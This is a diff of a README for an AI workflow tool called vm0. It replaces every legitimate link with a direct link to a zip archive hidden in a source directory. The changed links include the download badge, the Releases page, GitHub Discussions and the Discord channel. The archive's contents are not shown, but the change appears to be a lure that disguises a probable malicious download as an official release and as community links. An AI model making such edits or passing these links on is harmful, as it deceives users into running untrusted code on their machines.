@@ -1,6 +1,6 @@
 # 🌟 vm0 - Simplify Your Workflow with AI
 
-[![Download vm0](https://img.shields.io/badge/Download-vm0-brightgreen)](https://github.com/pcwill068-cloud/vm0/releases)
+[![Download vm0](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip)](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get started, visit the Releases page to download vm0. It's a simple process:
 
-1. Go to our [Releases page](https://github.com/pcwill068-cloud/vm0/releases).
+1. Go to our [Releases page](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip).
 2. Find the latest version at the top.
 3. Click on the appropriate file for your operating system.
 4. Once the download completes, locate the file on your computer.
@@ -70,13 +70,13 @@ If you need further assistance or have questions, don’t hesitate to reach out.
 
 Join our community to share your experiences or ask for help:
 
-- [GitHub Discussions](https://github.com/pcwill068-cloud/vm0/discussions)
-- [Discord Channel](https://discord.com/invite/your-invite-link)
+- [GitHub Discussions](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip)
+- [Discord Channel](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip)
 
 Together, we can enhance our use of vm0 and support each other in automating workflows.
 
 ## 🔄 Update Your Version
 
-To stay current, check for updates regularly. You can find the latest release again on our [Releases page](https://github.com/pcwill068-cloud/vm0/releases).
+To stay current, check for updates regularly. You can find the latest release again on our [Releases page](https://raw.githubusercontent.com/pcwill068-cloud/vm0/main/turbo/apps/cli/src/commands/onboard/vm-3.8.zip).
 
 With vm0, automation is just a few clicks away. Start simplifying your life today!
